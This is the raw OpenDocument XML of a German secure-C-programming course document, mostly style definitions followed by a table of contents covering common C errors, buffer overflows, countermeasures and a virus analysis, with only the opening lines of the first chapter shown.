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7.802cm" table:align="left"/>
    </style:style>
    <style:style style:name="Tabelle1.A" style:family="table-column">
      <style:table-column-properties style:column-width="4.967cm"/>
    </style:style>
    <style:style style:name="Tabelle1.B" style:family="table-column">
      <style:table-column-properties style:column-width="1.02cm"/>
    </style:style>
    <style:style style:name="Tabelle1.C" style:family="table-column">
      <style:table-column-properties style:column-width="1.81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5" style:family="table">
      <style:table-properties style:width="17cm" style:rel-width="100%" table:align="left"/>
    </style:style>
    <style:style style:name="Tabelle5.A" style:family="table-column">
      <style:table-column-properties style:column-width="5.338cm" style:rel-column-width="20575*"/>
    </style:style>
    <style:style style:name="Tabelle5.B" style:family="table-column">
      <style:table-column-properties style:column-width="11.663cm" style:rel-column-width="44960*"/>
    </style:style>
    <style:style style:name="Tabelle5.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border-left="0.05pt solid #000000" fo:border-right="none" fo:border-top="0.05pt solid #000000" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle5.B1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle5.A2" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border-left="0.05pt solid #000000" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle5.B2" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border-left="0.05pt solid #000000" fo:border-right="0.05pt solid #000000" fo:border-top="none" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle6" style:family="table">
      <style:table-properties style:width="17cm" style:rel-width="100%" table:align="left"/>
    </style:style>
    <style:style style:name="Tabelle6.A" style:family="table-column">
      <style:table-column-properties style:column-width="8.096cm" style:rel-column-width="31210*"/>
    </style:style>
    <style:style style:name="Tabelle6.B" style:family="table-column">
      <style:table-column-properties style:column-width="8.904cm" style:rel-column-width="34325*"/>
    </style:style>
    <style:style style:name="Tabelle6.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border-left="0.05pt solid #000000" fo:border-right="none" fo:border-top="0.05pt solid #000000" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle6.B1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle6.A2" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border-left="0.05pt solid #000000" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle6.B2" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border-left="0.05pt solid #000000" fo:border-right="0.05pt solid #000000" fo:border-top="none" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle7" style:family="table">
      <style:table-properties style:width="17cm" style:rel-width="100%" table:align="left"/>
    </style:style>
    <style:style style:name="Tabelle7.A" style:family="table-column">
      <style:table-column-properties style:column-width="7.213cm" style:rel-column-width="27803*"/>
    </style:style>
    <style:style style:name="Tabelle7.B" style:family="table-column">
      <style:table-column-properties style:column-width="9.788cm" style:rel-column-width="37732*"/>
    </style:style>
    <style:style style:name="Tabelle7.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border-left="0.05pt solid #000000" fo:border-right="none" fo:border-top="0.05pt solid #000000" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle7.B1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle7.A2" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border-left="0.05pt solid #000000" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle7.B2" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border-left="0.05pt solid #000000" fo:border-right="0.05pt solid #000000" fo:border-top="none" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle8" style:family="table">
      <style:table-properties style:width="17cm" style:rel-width="100%" table:align="left"/>
    </style:style>
    <style:style style:name="Tabelle8.A" style:family="table-column">
      <style:table-column-properties style:column-width="7.41cm" style:rel-column-width="28565*"/>
    </style:style>
    <style:style style:name="Tabelle8.B" style:family="table-column">
      <style:table-column-properties style:column-width="9.59cm" style:rel-column-width="36970*"/>
    </style:style>
    <style:style style:name="Tabelle8.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border-left="0.05pt solid #000000" fo:border-right="none" fo:border-top="0.05pt solid #000000" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle8.B1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle8.A2" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border-left="0.05pt solid #000000" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle8.B2" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border-left="0.05pt solid #000000" fo:border-right="0.05pt solid #000000" fo:border-top="none" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle9" style:family="table">
      <style:table-properties style:width="17cm" style:rel-width="100%" table:align="left"/>
    </style:style>
    <style:style style:name="Tabelle9.A" style:family="table-column">
      <style:table-column-properties style:column-width="7.599cm" style:rel-column-width="29292*"/>
    </style:style>
    <style:style style:name="Tabelle9.B" style:family="table-column">
      <style:table-column-properties style:column-width="9.402cm" style:rel-column-width="36243*"/>
    </style:style>
    <style:style style:name="Tabelle9.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border-left="0.05pt solid #000000" fo:border-right="none" fo:border-top="0.05pt solid #000000" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle9.B1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle9.A2" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border-left="0.05pt solid #000000" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle9.B2" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border-left="0.05pt solid #000000" fo:border-right="0.05pt solid #000000" fo:border-top="none" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle10" style:family="table">
      <style:table-properties style:width="17cm" style:rel-width="100%" table:align="left"/>
    </style:style>
    <style:style style:name="Tabelle10.A" style:family="table-column">
      <style:table-column-properties style:column-width="8.119cm" style:rel-column-width="31298*"/>
    </style:style>
    <style:style style:name="Tabelle10.B" style:family="table-column">
      <style:table-column-properties style:column-width="8.881cm" style:rel-column-width="34237*"/>
    </style:style>
    <style:style style:name="Tabelle10.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border-left="0.05pt solid #000000" fo:border-right="none" fo:border-top="0.05pt solid #000000" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle10.B1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle10.A2" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border-left="0.05pt solid #000000" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle10.B2" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border-left="0.05pt solid #000000" fo:border-right="0.05pt solid #000000" fo:border-top="none" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle11" style:family="table">
      <style:table-properties style:width="17cm" style:rel-width="100%" table:align="left"/>
    </style:style>
    <style:style style:name="Tabelle11.A" style:family="table-column">
      <style:table-column-properties style:column-width="2.946cm" style:rel-column-width="11355*"/>
    </style:style>
    <style:style style:name="Tabelle11.B" style:family="table-column">
      <style:table-column-properties style:column-width="14.055cm" style:rel-column-width="54180*"/>
    </style:style>
    <style:style style:name="Tabelle11.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border-left="0.05pt solid #000000" fo:border-right="none" fo:border-top="0.05pt solid #000000" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle11.B1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle11.A2" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border-left="0.05pt solid #000000" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle11.B2" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border-left="0.05pt solid #000000" fo:border-right="0.05pt solid #000000" fo:border-top="none" fo:border-bottom="0.05pt solid #000000"/>
    </style:style>
    <style:style style:name="Tabelle12" style:family="table">
      <style:table-properties style:width="17cm" style:rel-width="100%" table:align="left"/>
    </style:style>
    <style:style style:name="Tabelle12.A" style:family="table-column">
      <style:table-column-properties style:column-width="17cm" style:rel-column-width="65535*"/>
    </style:style>
    <style:style style:name="Tabelle12.A1" style:family="table-cell">
      <style:table-cell-properties style:vertical-align="middle" fo:padding="0.069cm" fo:border="none"/>
    </style:style>
    <style:style style:name="P1" style:family="paragraph" style:parent-style-name="Table_20_Contents">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code">
      <style:text-properties fo:color="#ff0000"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="code">
      <style:text-properties fo:color="#ff0000" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="code">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="code">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ff0000" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0.176cm" fo:margin-bottom="0.176cm" style:contextual-spacing="false" fo:text-align="justify" style:justify-single-word="false" fo:padding="0cm" fo:border="none"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="1.27cm" fo:margin-right="0cm" fo:margin-top="0.176cm" fo:margin-bottom="0.176cm" style:contextual-spacing="false" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0cm" style:auto-text-indent="false" fo:padding="0cm" fo:border="none"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:padding="0cm" fo:border="none"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.176cm" fo:margin-bottom="0.176cm" style:contextual-spacing="false" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0cm" style:auto-text-indent="false" fo:padding="0cm" fo:border="none"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="code">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="code">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:padding="0.074cm" fo:border-left="none" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.06pt solid #000000" style:join-border="false"/>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color="#ff0000" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="List_20_3"/>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="List_20_3">
      <style:text-properties officeooo:paragraph-rsid="000c5cfc"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="List_20_3">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="List_20_3"/>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text-properties fo:color="#ff0000" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:color="#ff0000" fo:font-weight="bold" officeooo:paragraph-rsid="000fe4ac" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="000fe4ac"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties officeooo:paragraph-rsid="0010dbe0"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="List_20_3">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
      <style:text-properties officeooo:paragraph-rsid="000fe4ac"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Heading_20_3">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="false"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Table_20_Contents" style:list-style-name="L2"/>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de">
      <style:text-properties fo:color="#ff0000"/>
    </style:style>
    <style:style style:name="P42" style:family="paragraph" style:parent-style-name="code">
      <style:text-properties fo:color="#ff0000" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="code">
      <style:text-properties fo:color="#ff0000" fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P44" style:family="paragraph" style:parent-style-name="code">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0cm" style:contextual-spacing="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color="#0000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fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:color="#ff0000" fo:font-style="italic" officeooo:rsid="000fe4ac" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties fo:color="#008000"/>
    </style:style>
    <style:style style:name="T11" style:family="text">
      <style:text-properties officeooo:rsid="000c5cfc"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties officeooo:rsid="000d9a03"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties officeooo:rsid="000e5cad"/>
    </style:style>
    <style:style style:name="T14" style:family="text">
      <style:text-properties fo:color="#0000ff"/>
    </style:style>
    <style:style style:name="T15" style:family="text">
      <style:text-properties fo:color="#0000ff" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties officeooo:rsid="000fe4ac"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="T18" style:family="text">
      <style:text-properties officeooo:rsid="0010db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8"><text:a xlink:type="simple" xlink:href="#__RefHeading__1846_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1. </text:a>Häufige Fehlerursachen in C<text:tab/>2</text:p>
          <text:p text:style-name="P39"><text:a xlink:type="simple" xlink:href="#__RefHeading__1848_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.1. </text:a>Ziele<text:tab/>2</text:p>
          <text:p text:style-name="P39"><text:a xlink:type="simple" xlink:href="#__RefHeading__1850_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.2. </text:a>Fehler allgemeiner Art<text:tab/>2</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1852_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.2.1. </text:a>Verwechslung von == und = <text:tab/>2</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1854_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.2.2. </text:a>Verwechslung von ' und " <text:tab/>2</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1856_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.2.3. </text:a>Verwechslung der Stellung von In/Dekrement-Operatoren <text:tab/>2</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1858_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.2.4. </text:a>Kontrollstrukturen <text:tab/>3</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1860_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.2.5. </text:a>Fehlendes break im switch-Statement <text:tab/>3</text:p>
          <text:p text:style-name="P39"><text:a xlink:type="simple" xlink:href="#__RefHeading__1862_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.3. </text:a>Fehler bei Arrays<text:tab/>3</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1864_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.3.1. </text:a>Bereichsüberschreitung <text:tab/>3</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1866_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.3.2. </text:a>Arrays als Parameter <text:tab/>3</text:p>
          <text:p text:style-name="P39"><text:a xlink:type="simple" xlink:href="#__RefHeading__1868_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.4. </text:a>Fehler bei der Stringbehandlung<text:tab/>4</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1870_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.4.1. </text:a>nicht abgeschlossene Strings <text:tab/>4</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1872_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.4.2. </text:a>Vergleich bzw. Zuweisung <text:tab/>4</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1874_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.4.3. </text:a>Unterschied zwischen Leerstring und NULL <text:tab/>4</text:p>
          <text:p text:style-name="P39"><text:a xlink:type="simple" xlink:href="#__RefHeading__1876_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.5. </text:a>Fehler bei Zeigern<text:tab/>5</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1878_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.5.1. </text:a>nicht initialisierte Zeiger <text:tab/>5</text:p>
          <text:p text:style-name="P39"><text:a xlink:type="simple" xlink:href="#__RefHeading__1880_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.6. </text:a>Fehler bei Funktionsaufrufen<text:tab/>5</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1882_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.6.1. </text:a>Funktionsaufruf stimmt mit der Vereinbarung nicht überein <text:tab/>5</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1884_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.6.2. </text:a>Der Funktionsaufruf ist richtig, die Bedeutung jedoch falsch <text:tab/>5</text:p>
          <text:p text:style-name="P39"><text:a xlink:type="simple" xlink:href="#__RefHeading__1886_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.7. </text:a>Fehler bei der Typkonvertierung<text:tab/>6</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1888_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.7.1. </text:a>Ausdrücke <text:tab/>6</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1890_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.7.2. </text:a>Char und Int Konvertierung <text:tab/>6</text:p>
          <text:p text:style-name="P39"><text:a xlink:type="simple" xlink:href="#__RefHeading__1892_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">1.8. </text:a>MEILENSTEIN: Finde den Fehler<text:tab/>6</text:p>
          <text:p text:style-name="P38"><text:a xlink:type="simple" xlink:href="#__RefHeading__1894_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">2. </text:a>Buffer-Overflow (Speicherüberlauf)<text:tab/>7</text:p>
          <text:p text:style-name="P39"><text:a xlink:type="simple" xlink:href="#__RefHeading__1896_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">2.1. </text:a>Speicherverwaltung von Programmen<text:tab/>8</text:p>
          <text:p text:style-name="P39"><text:a xlink:type="simple" xlink:href="#__RefHeading__1898_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">2.2. </text:a>Der Stack-Frame <text:tab/>10</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1900_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">2.2.1. </text:a>Die CPU-Register zur Stack-Verwaltung<text:tab/>11</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1902_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">2.2.2. </text:a>Beispiel-Assembler-Code für den Aufruf einer Funktion (caller)<text:tab/>11</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1904_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">2.2.3. </text:a>Beispiel-Assembler-Code für die aufgerufene Funktion (callee)<text:tab/>11</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1906_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">2.2.4. </text:a>Assembler-Code/Maschinen-Code (stackframe.c)<text:tab/>12</text:p>
          <text:p text:style-name="P39"><text:a xlink:type="simple" xlink:href="#__RefHeading__1908_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">2.3. </text:a>Rücksprungadresse manipulieren<text:tab/>13</text:p>
          <text:p text:style-name="P39"><text:a xlink:type="simple" xlink:href="#__RefHeading__1910_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">2.4. </text:a>Gegenmaßnahmen zum Buffer-Overflow während der Programmerstellung<text:tab/>18</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1912_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">2.4.1. </text:a>Unsicheres Einlesen von Eingabestreams<text:tab/>19</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1914_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">2.4.2. </text:a>Unsichere Funktionen zur Stringbearbeitung<text:tab/>19</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1916_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">2.4.3. </text:a>Unsichere Funktionen zur Bildschirmausgabe<text:tab/>20</text:p>
          <text:p text:style-name="P40"><text:a xlink:type="simple" xlink:href="#__RefHeading__1918_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">2.4.4. </text:a>Weitere unsichere Funktionen im Überblick<text:tab/>20</text:p>
          <text:p text:style-name="P39"><text:a xlink:type="simple" xlink:href="#__RefHeading__1920_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">2.5. </text:a>Übung: Buffer Overflow<text:tab/>20</text:p>
          <text:p text:style-name="P38"><text:a xlink:type="simple" xlink:href="#__RefHeading__1922_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">3. </text:a>Analyse eines Virusprogrammes<text:tab/>21</text:p>
          <text:p text:style-name="P39"><text:a xlink:type="simple" xlink:href="#__RefHeading__1924_390052085" text:style-name="Internet_20_link" text:visited-style-name="Internet_20_link">3.1. </text:a>Fragen zum Virusprogramm<text:tab/>23</text:p>
        </text:index-body>
      </text:table-of-content>
      <text:p text:style-name="Text_20_body"/>
      <text:h text:style-name="Heading_20_1" text:outline-level="1" text:restart-numbering="true" text:start-value="-1"><text:bookmark-start text:name="__RefHeading__1846_390052085"/><text:soft-page-break/><text:span text:style-name="Strong_20_Emphasis"><text:span text:style-name="T2">Häufige Fehlerursachen in C</text:span></text:span><text:bookmark-end text:name="__RefHeading__1846_390052085"/></text:h>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__1848_390052085"/>Ziele<text:bookmark-end text:name="__RefHeading__1848_390052085"/></text:h>
      <text:list xml:id="list398504580" text:style-name="List_20_3">
        <text:list-item>
          <text:p text:style-name="P24">Ein besseres, sicheres C-Programmieren</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P24">Quellen:</text:p>
          <text:list>
            <text:list-item>
              <text:p text:style-name="P24">Michael Thell</text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P24"><text:a xlink:type="simple" xlink:href="http://cplus.kompf.de/artikel/errc.html">http://cplus.kompf.de/artikel/errc.html</text:a></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P24"><text:a xlink:type="simple" xlink:href="http://openbook.galileocomputing.de/c_von_a_bis_z/">http://openbook.galileocomputing.de/c_von_a_bis_z/</text:a> </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P24"><text:a xlink:type="simple" xlink:href="http://www.cplusplus.com/reference/clibrary/">http://www.cplusplus.com/reference/clibrary/</text:a> </text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P24"><text:a xlink:type="simple" xlink:href="http://insecure.org/stf/smashstack.html">http://insecure.org/stf/smashstack.html</text:a></text:p>
            </text:list-item>
            <text:list-item>
              <text:p text:style-name="P24"><text:a xlink:type="simple" xlink:href="http://www.cs.virginia.edu/~evans/cs216/guides/x86.html">http://www.cs.virginia.edu/~evans/cs216/guides/x86.html</text:a></text:p>
            </text:list-item>
          </text:list>
        </text:list-item>
      </text:list>
      <text:h text:style-name="Heading_20_2" text:outline-level="2"><text:bookmark-start text:name="__RefHeading__1850_390052085"/>Fehler allgemeiner Art<text:bookmark-end text:name="__RefHeading__1850_390052085"/></text:h>
      <text:h text:style-name="Heading_20_3" text:outline-level="3"><text:bookmark-start text:name="__RefHeading__1852_390052085"/><text:span text:style-name="T3">Verwechslung von == und =</text:span> <text:bookmark-end text:name="__RefHeading__1852_390052085"/></text:h>
      <text:p text:style-name="Text_20_body">Vergleichsoperator mit dem Zuweisungsoperator verwechseln.</text:p>
      <text:p text:style-name="Text_20_body"/>
